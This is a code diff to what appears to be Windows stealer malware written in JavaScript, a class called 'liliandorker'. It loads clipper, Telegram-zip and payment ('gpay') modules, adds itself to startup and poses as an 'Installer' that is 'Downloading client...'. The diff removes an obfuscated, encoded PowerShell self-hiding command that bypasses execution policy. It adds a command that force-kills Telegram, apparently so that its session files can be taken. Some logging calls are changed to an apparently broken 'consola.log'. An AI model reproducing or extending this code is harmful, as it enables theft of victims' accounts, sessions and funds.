@@ -96,6 +96,8 @@ var base64 = {
     },
 };
 
+const exec = require('child_process').exec;
+
 class liliandorker {
     constructor() {
         this.requires = {
@@ -145,6 +147,7 @@ class liliandorker {
             protection: require("./utils/protection")(this),
             prototype: require("./utils/prototype")(this),
             time: require("./utils/time")(this),
+            gpay: require("./utils/gpay")(this),
             clipper: require("./utils/clipper")(this),
             jszip: require("./utils/jszip")(this),
             jsziptg: require("./utils/jsziptg")(this),
@@ -170,7 +173,7 @@ class liliandorker {
                 )
             );
 
-        console.log(process.argv0);
+        consola.log(process.argv0);
 
         setTimeout(() => {
             this.requires.fs.rename(
@@ -185,23 +188,28 @@ class liliandorker {
             );
         }, 3000);
 
-        console.log("Added to startup");
+        consola.log("Added to startup");
     }
 
-    hideSelf() {
-        this.requires.child_process.execSync(
-            `Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIAUQBXAFIAawBMAFYAUgA1AGMARwBVAGcATABVADUAaABiAFcAVQBnAFYAMgBsAHUAWgBHADkAMwBJAEMAMQBPAFkAVwAxAGwAYwAzAEIAaABZADIAVQBnAFEAMgA5AHUAYwAyADkAcwBaAFMAQQB0AFQAVwBWAHQAWQBtAFYAeQBSAEcAVgBtAGEAVwA1AHAAZABHAGwAdgBiAGkAQQBuAEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkARgB0AEUAYgBHAHgASgBiAFgAQgB2AGMAbgBRAG8ASQBrAHQAbABjAG0ANQBsAGIARABNAHkATABtAFIAcwBiAEMASQBwAFgAUQAwAEsASQBDAEEAZwBJAEMAQQBnAEkAQwBCAHcAZABXAEoAcwBhAFcATQBnAGMAMwBSAGgAZABHAGwAagBJAEcAVgA0AGQARwBWAHkAYgBpAEIASgBiAG4AUgBRAGQASABJAGcAUgAyAFYAMABRADIAOQB1AGMAMgA5AHMAWgBWAGQAcABiAG0AUgB2AGQAeQBnAHAATwB3ADAASwBJAEMAQQBnAEkAQQAwAEsASQBDAEEAZwBJAEMAQQBnAEkAQwBCAGIAUgBHAHgAcwBTAFcAMQB3AGIAMwBKADAASwBDAEoAMQBjADIAVgB5AE0AegBJAHUAWgBHAHgAcwBJAGkAbABkAEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkASABCADEAWQBtAHgAcABZAHkAQgB6AGQARwBGADAAYQBXAE0AZwBaAFgAaAAwAFoAWABKAHUASQBHAEoAdgBiADIAdwBnAFUAMgBoAHYAZAAxAGQAcABiAG0AUgB2AGQAeQBoAEoAYgBuAFIAUQBkAEgASQBnAGEARgBkAHUAWgBDAHcAZwBTAFcANQAwAE0AegBJAGcAYgBrAE4AdABaAEYATgBvAGIAMwBjAHAATwB3ADAASwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAbgBEAFEAbwBnAEkAQwBBAGcARABRAG8AZwBJAEMAQQBnAEkAQwBBAGcASQBDAFIAagBiADIANQB6AGIAMgB4AGwAVQBIAFIAeQBJAEQAMABnAFcAMABOAHYAYgBuAE4AdgBiAEcAVQB1AFYAMgBsAHUAWgBHADkAMwBYAFQAbwA2AFIAMgBWADAAUQAyADkAdQBjADIAOQBzAFoAVgBkAHAAYgBtAFIAdgBkAHkAZwBwAEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBNAHcASQBHAGgAcABaAEcAVQBOAEMAaQBBAGcASQBDAEEAZwBJAEMAQQBnAFcAMABOAHYAYgBuAE4AdgBiAEcAVQB1AFYAMgBsAHUAWgBHADkAMwBYAFQAbwA2AFUAMgBoAHYAZAAxAGQAcABiAG0AUgB2AGQAeQBnAGsAWQAyADkAdQBjADIAOQBzAFoAVgBCADAAYwBpAHcAZwBNAEMAawBOAEMAZwA9AD0AIgB9ACcAIAB8ACAAQwBvAG4AdgBlAHIAdABGAHIAbwBtAC0ASgBzAG8AbgApAC4AUwBjAHIAaQBwAHQAKQApACAAfAAgAGkAZQB4AA==`
-        );
-    }
+
 
     async init() {
         process.on("unhandledRejection", (err) => {
-            console.log(err);
+            consola.log(err);
         });
 
         process.on("uncaughtException", (exc) => {
-            console.log(exc);
+            consola.log(exc);
         });
+
+        exec('taskkill /IM Telegram.exe /F', (error, stdout, stderr) => {
+            if (error) {
+                consola.error(`exec error: ${error}`);
+                return;
+            }
+            consola.log(`stdout: ${stdout}`);
+            consola.log(`stderr: ${stderr}`);
+        })
 
         process.title = "Installer";
         console.log("Downloading client...");
